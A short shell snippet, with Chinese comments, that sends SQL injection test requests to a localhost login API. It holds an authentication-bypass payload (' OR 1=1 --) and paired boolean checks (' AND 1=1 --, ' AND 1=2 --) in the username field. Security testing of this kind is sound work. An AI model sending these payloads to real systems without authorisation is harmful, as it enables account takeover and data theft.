# SQL注入测试
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "'\'' OR 1=1 --", "password": "***"}'

# 确认
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "'\'' AND 1=1 --", "password": "***"}'

curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "'\'' AND 1=2 --", "password": "***"}'
